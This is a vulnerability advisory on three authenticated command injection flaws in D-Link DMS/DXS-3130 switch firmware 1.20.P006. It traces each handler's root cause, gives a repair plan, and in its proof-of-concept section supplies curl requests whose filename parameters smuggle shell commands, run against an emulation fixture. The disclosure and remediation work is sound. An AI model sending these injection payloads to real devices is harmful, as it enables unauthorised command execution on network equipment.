# D-Link DMS/DXS-3130 Three Authenticated OS Command Injection Vulnerabilities

## Title

D-Link DMS/DXS-3130 1.20.P006 Authenticated OS Command Injection in the File Copy, SSL Import, and Nuclias Manager Profile Import Handlers

## Description

### 1. Vulnerability Names

1. Authenticated OS command injection in `369_copyfile.lua` through the `http_src_file` parameter.
2. Authenticated OS command injection in `898_ssl_global.lua` through the `file_name` parameter.
3. Authenticated OS command injection in `464_Nuclias_Manager_Settings.lua` through the `nuclias_manager_profile_src_file_name` parameter.

### 2. Vulnerability Contributor and Submitter

- **Researcher**: Lumina
- **Contact**: 1547800591@qq.com

### 3. Vendor and Product Information

- **Vendor**: D-Link Corporation
- **Vendor homepage**: https://www.dlink.com/
- **Product**: D-Link DMS-3130 / DXS-3130 Series Switch Operating System
- **Web stack**: lighttpd 1.4.26, `lua_magnet`, `libluaconn.so`, `librpcclt.so`, and `liblua.so`
- **Vulnerability class**: CWE-78 — Improper Neutralization of Special Elements Used in an OS Command

| ID | Accessible handler | Affected operation | Affected POST parameter |
|---|---|---|---|
| V1 | `/htdocs/lua/DataStore/369_copyfile.lua` | HTTP file copy/download | `http_src_file` |
| V2 | `/htdocs/lua/DataStore/898_ssl_global.lua` | SSL certificate/private-key import | `file_name` |
| V3 | `/htdocs/lua/DataStore/464_Nuclias_Manager_Settings.lua` | Nuclias Manager profile import | `nuclias_manager_profile_src_file_name` |

![image-20261105151720711](DMS_DXS3130_1.20.P006-authenticated-command-injection-RCE.EN.assets/image-20261105151720711.png)

### 4. Affected Version

- **Firmware**: `1.20.P006`
- **Firmware file**: `DMS_DXS3130_RUN_1.20.P006(0603105123).img`
- **Original firmware SHA-256**: `14ed5809ece7e281994e763ad484213be3e492de884c4f4cc9242a2e40d77e03`
- **Decoded image SHA-256**: `e91b4f3c7e911dea47cbbe2999100c617feb7427ff7f1c4a995c5154288e0d80`
- **Architecture**: 32-bit little-endian ARM, Cortex-A9
- **Kernel**: Linux 4.14.48
- **Other relevant components**: BusyBox 1.22.1 and glibc 2.21

The supplied image uses a four-byte halfword transformation with byte order `[2,3,0,1]`; it is not encrypted. The findings apply to the supplied `1.20.P006` image. Other firmware versions were not tested.

### 5. Vulnerability Class and Attack Conditions

- **Attack vector**: Network, through the device management Web service.
- **Authentication required**: Yes.
- **Required authorization**: A valid Web session with read/write access. The firmware's `/htdocs/lua/` authentication configuration requires level 1, and each affected handler also invokes `check_privilege_level()`.
- **Session cookie**: `SID` for HTTP or `SIDSSL` for HTTPS.
- **User interaction required**: No additional interaction is required after an authenticated session has been obtained.
- **Backend prerequisite**: `usmDbHttpTransferFilePrepare` must return success. V1 and V2 also require the temporary-path RPC call to return a path; V3 uses the fixed `/mnt/download/` path.
- **Command output**: The injection is blind through the normal HTTP response. The supplied PoCs redirect `id` output to a marker file for verification.
- **Privileges gained**: Those of the Web/Lua process. Real-device UID and root access were not verified. The emulation fixture intentionally ran as `uid=1000`, not root.

### 6. Severity

An attacker with a valid read/write management session can escape the intended file-import operation and execute arbitrary shell commands with the Web process's privileges. Authentication reduces exposure but does not make an unrestricted shell command safe: a compromised management account can be converted into arbitrary command execution outside the intended configuration workflow.

### 7. Vulnerability Description

The three handlers accept a client-controlled source filename and interpolate it directly into an unquoted `mv` command. They call `os.execute()` without shell escaping or a shell-metacharacter allowlist. The `strip_filename()` helper only derives the destination basename; it does not sanitize the source value passed to the shell.

The common vulnerable pattern is:

```lua
command = string.format('mv %s %s%s', src_file, web_temp_path, web_temp_file)
res, _ = os.execute(command)
```

A source value such as:

```text
/tmp/nonexistent; id > /tmp/proof; #
```

terminates the initial `mv` argument, executes the injected `id` command, and uses `#` to comment out the remaining destination text. Failure of the initial `mv`, a failed subsequent file transfer, or an invalid-configuration response does not undo a command that has already executed.

### 8. Technical Details and Root Cause

#### Authentication and privilege checks

`check_privilege_level()` in `application/webroot/lua/include/webutil.lua:2337-2348` requires `fastpath_access_is_readwrite()`. Session identifiers are defined in `application/webroot/lua/scripts/web_defs.lua:133-144`, including `SID` and `SIDSSL`.

These checks establish that the issues are post-authentication. They do not sanitize POST values or prevent command injection after an authorized request reaches a handler.

#### Common native sink

The ARM `os.execute` implementation in `liblua.so`, identified as `sub_E9C0`, passes the command string to `system` without adding another filtering layer. The relevant call is at `0xE9D8`:

```asm
BLX system
```

The three Lua handlers therefore reach a real shell-execution sink rather than a file-only API.

#### V1 — `369_copyfile.lua` / `http_src_file`

Source-to-sink flow in `application/webroot/lua/DataStore/369_copyfile.lua`:

1. Line 509 obtains POST data through `get_user_input()`; lines 540-549 dispatch a POST containing `http_src_file` to `http_file_transfer_download()`.
2. Line 83 assigns `fpost.http_src_file` to `src_file`.
3. Lines 110-147 select the file-transfer operation and prepare the HTTP transfer. `hiddest_filetype=1` selects the firmware-image branch used by the PoC.
4. Line 150 applies `strip_filename(src_file)` only to derive `web_temp_file`.
5. Lines 154-156 construct and execute `mv %s %s%s` with the original, unquoted `src_file`.



#### V2 — `898_ssl_global.lua` / `file_name`

Source-to-sink flow in `application/webroot/lua/DataStore/898_ssl_global.lua`:

1. Lines 63 and 158-164 obtain POST input and dispatch a request containing `file_name` after the read/write privilege check.
2. Line 69 assigns `form_post.file_name` to `src_file`.
3. Line 96 calls `usmDbHttpTransferFilePrepare`; line 99 obtains the SSL temporary path.
4. Line 100 derives the destination basename, but lines 104-106 interpolate and execute the original `src_file` without quoting.

`radisCertFile=1` selects the certificate-import branch. The same handler also supports private-key import, but the supplied PoC uses the certificate branch.



#### V3 — `464_Nuclias_Manager_Settings.lua` / `nuclias_manager_profile_src_file_name`

Source-to-sink flow in `application/webroot/lua/DataStore/464_Nuclias_Manager_Settings.lua`:

1. Lines 146-150 obtain POST input and assign `nuclias_manager_profile_src_file_name` to `input_nuclias_manager_profile_file_name`.
2. Lines 209-210 enforce the read/write privilege check.
3. Lines 258-259 pass the value to `http_import_nuclias_manager_profile()` when it is non-empty.
4. Line 63 assigns the function argument to `src_file`; line 83 selects the fixed `/mnt/download/` destination directory.
5. Lines 88-89 construct and execute the unquoted `mv` command.
6. Only afterward, at lines 260-262, does the script validate the imported Nuclias Manager profile.

Consequently, `Error! Invalid Nuclias Manager Profile.` is not evidence that the injected command was blocked.



### 9. Proof of Concept

The following steps reproduce the findings with the supplied isolated firmware-emulation fixture running at `http://127.0.0.1:28080`. Use `--no-cookie` for all three verification commands: no login, SID, or SIDSSL is required in this fixture because its authentication checks were deliberately relaxed. This test-only setting is not an authentication-bypass claim against the original firmware. The scripts require only Python 3's standard library and do not follow redirects automatically.

#### V1 reproduction

```bash
python dms_dxs3130_369_copyfile_exp.py -t http://127.0.0.1:28080 --no-cookie
```

Equivalent raw request against the emulation fixture:

```bash
curl -i -X POST 'http://127.0.0.1:28080/htdocs/lua/DataStore/369_copyfile.lua' \
  --data-urlencode 'hiddest_filetype=1' \
  --data-urlencode 'hiddest_unitid=1' \
  --data-urlencode 'hidfile_src_name=x' \
  --data-urlencode 'hidreplace_option=0' \
  --data-urlencode 'hiddest_optiontype=0' \
  --data-urlencode 'http_src_file=/tmp/nonexistent; id > /tmp/dms_dxs3130_369_proof; #'
```

Observed in emulation:

```text
HTTP 302
Location: /htdocs/pages/iss/369_copyfile_http_process_bar.lsp?file_type=1&proto_type=4&filename=x&error_msg=&0

/tmp/dms_dxs3130_369_proof:
uid=1000(iotsec-zone) gid=1000(iotsec-zone) ...
```

![image-20261105181454622](DMS_DXS3130_1.20.P006-authenticated-command-injection-RCE.EN.assets/image-20261105181454622.png)

#### V2 reproduction

```bash
python dms_dxs3130_898_ssl_global_exp.py -t http://127.0.0.1:28080 --no-cookie
```

Equivalent raw request against the emulation fixture:

```bash
curl -i -X POST 'http://127.0.0.1:28080/htdocs/lua/DataStore/898_ssl_global.lua' \
  --data-urlencode 'radisCertFile=1' \
  --data-urlencode 'txtdest_file=x' \
  --data-urlencode 'file_name=/tmp/nonexistent; id > /tmp/dms_dxs3130_898_proof; #'
```

Observed in emulation:

```text
HTTP 303
Location: /htdocs/pages/main/error.lsp?Success%2E&0

/tmp/dms_dxs3130_898_proof:
uid=1000(iotsec-zone) gid=1000(iotsec-zone) ...
```

![image-20261105181739382](DMS_DXS3130_1.20.P006-authenticated-command-injection-RCE.EN.assets/image-20261105181739382.png)

#### V3 reproduction

```bash
python dms_dxs3130_464_nuclias_manager_exp.py -t http://127.0.0.1:28080 --no-cookie
```

Equivalent raw request against the emulation fixture:

```bash
curl -i -X POST 'http://127.0.0.1:28080/htdocs/lua/DataStore/464_Nuclias_Manager_Settings.lua' \
  --data-urlencode 'nuclias_manager_profile_src_file_name=/tmp/nonexistent; id > /tmp/dms_dxs3130_464_proof; #'
```

Observed in emulation:

```text
HTTP 303
Location: /htdocs/pages/main/error.lsp?Error%21%20Invalid%20Nuclias%20Manager%20Profile%2E&0

/tmp/dms_dxs3130_464_proof:
uid=1000(iotsec-zone) gid=1000(iotsec-zone) ...
```

![image-20261105181904941](DMS_DXS3130_1.20.P006-authenticated-command-injection-RCE.EN.assets/image-20261105181904941.png)

#### Verification and custom commands

Inside the emulated root filesystem, the markers are `/tmp/dms_dxs3130_369_proof`, `/tmp/dms_dxs3130_898_proof`, and `/tmp/dms_dxs3130_464_proof`. From the VM host, verify their `id` output with:

```bash
cat /home/iotsec-zone/Desktop/DMS_DXS3130_1.20.P006/runtime-root/tmp/dms_dxs3130_369_proof
cat /home/iotsec-zone/Desktop/DMS_DXS3130_1.20.P006/runtime-root/tmp/dms_dxs3130_898_proof
cat /home/iotsec-zone/Desktop/DMS_DXS3130_1.20.P006/runtime-root/tmp/dms_dxs3130_464_proof
```

An arbitrary command can be supplied with `-c`; for example:

```bash
python dms_dxs3130_369_copyfile_exp.py -t http://127.0.0.1:28080 --no-cookie -c "touch /tmp/authorized_test_369"
```

Do not use `--no-cookie` as evidence that a physical device permits unauthenticated access. 

A `302`/`303` response alone is not proof of execution. Verification requires the marker, a command result, or equivalent runtime evidence.

### 10. Impact

- **V1 — file copy**: An authenticated attacker can execute commands instead of performing the intended firmware/configuration copy, potentially reading or altering accessible files, changing device configuration, or disrupting the service.
- **V2 — SSL import**: An authenticated attacker can execute commands through certificate/private-key import. The surrounding workflow also handles sensitive TLS material, increasing potential post-exploitation impact.
- **V3 — Nuclias Manager profile import**: An authenticated attacker can execute commands without supplying a valid Nuclias Manager profile. Profile-validation failure occurs too late to prevent execution.

Across all three findings, impact is constrained by the actual Web process UID, filesystem permissions, enabled services, and device configuration. 

### 11. Repair Plan

1. Remove all three `string.format('mv ...')` plus `os.execute()` data flows. Use `os.rename()` or a native file API with fixed source and destination paths; handle cross-filesystem moves without invoking a shell.
2. Do not accept a client-supplied source path. Associate each upload with a server-generated identifier and a fixed temporary directory, then resolve only that server-side object.
3. Canonicalize destination paths, enforce directory membership after canonicalization, reject unsafe links, and use restrictive file permissions. Do not treat shell-metacharacter filtering as a substitute for removing the shell.
4. Apply the same correction independently to all three handlers so that fixing one import workflow does not leave the others exploitable.
5. Preserve and test the existing read/write authorization checks. Verify authorization again at the file-operation boundary and audit other upload, import, TFTP, HTTP, and language-pack handlers for the same pattern.
6. Run the Web service with least privilege and restrict its filesystem, executable, and network capabilities to reduce post-authentication impact.
7. Add regression tests containing semicolons, command substitutions, whitespace, redirections, newlines, and comment characters; verify that none reach a command interpreter.

### 12. Verification and Disclosure Notes

- **Evidence level for all three findings**: **RUNTIME_OBSERVED** in firmware emulation, not real-device `VALIDATED`.
- The original ARM lighttpd, both `lua_magnet` FastCGI backends, the original Web frontend/Lua handlers, `liblua.so`, and BusyBox were running on `127.0.0.1:28080` in the authorized VM.
- Each final, attached EXP was executed against the corresponding original Lua handler. The observed marker contained `id` output from the emulation Web process (`uid=1000`), confirming command execution under that fixture.
- The Broadcom `/dev/linux-user-bde` device was unavailable, so the complete `switchdrvr` hardware backend could not run. RPC success responses and authentication test doubles were used only in the emulation copy. The tested input parsing, vulnerable command concatenation, and `os.execute` sink were not modified.
- A real device must be used to confirm the complete login flow, minimum required account privilege, actual RPC results, and Web-process UID. No claim is made that an arbitrary SID, an invalid SID, or no session will work on physical hardware.
- The three reports are command-injection vulnerabilities, not authentication-bypass findings. 

Supporting files supplied with this report:

- `dms_dxs3130_369_copyfile_exp.py` — V1 standalone Python 3 EXP.
- `dms_dxs3130_898_ssl_global_exp.py` — V2 standalone Python 3 EXP.
- `dms_dxs3130_464_nuclias_manager_exp.py` — V3 standalone Python 3 EXP.
